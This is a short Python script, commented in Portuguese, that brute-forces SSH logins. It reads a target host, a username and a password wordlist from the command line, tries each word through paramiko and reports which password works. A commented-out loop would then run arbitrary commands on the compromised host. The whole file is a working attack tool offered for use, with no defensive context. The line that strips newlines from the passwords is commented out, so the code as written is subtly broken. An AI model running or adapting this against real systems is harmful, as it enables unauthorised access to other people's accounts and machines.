import paramiko
import sys

host = sys.argv[1] ###pega os parametros do host
user = sys.argv[2] ###pega os parametros do usuario

arquivo = open(sys.argv[3]) ####recebe o arquivo que sera passado na linha de comando, chamado de worlist
linhas = arquivo.readlines() ###ler as linhas dos arquivos 
for linha in linhas: ####fazendo laco para ler cada linha de dentro do arquivo
    try: ### tente
        fim = len(linha)###recebe o numero de caracteres que tem a primeira palavra do arquivo
        client = paramiko.SSHClient() ###Criacao do objeto
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())###trata a chave publica
        client.connect(host, username=user, password=linha)      
         ### client.connect(host, username=user, password=linha[0:fim-1])###aqui ja conecta com as informacoes
        print("[+] senha correta ! >>",linha)###caso de certo, a senha esta correta
        print(len(linha))
        print("conectou")
    except:
        print("[-]Erro >>",linha)####caso nao de certo, a senha esta errada
        print("nao conectado")

###################while True:###entra em um laco infinito
####################    comando = input("Comando: ")####
   #################### entrada, saida, erros = client.exec_command(comando)
   #################### print(saida.readlines())
   #################### print(erros.readlines())
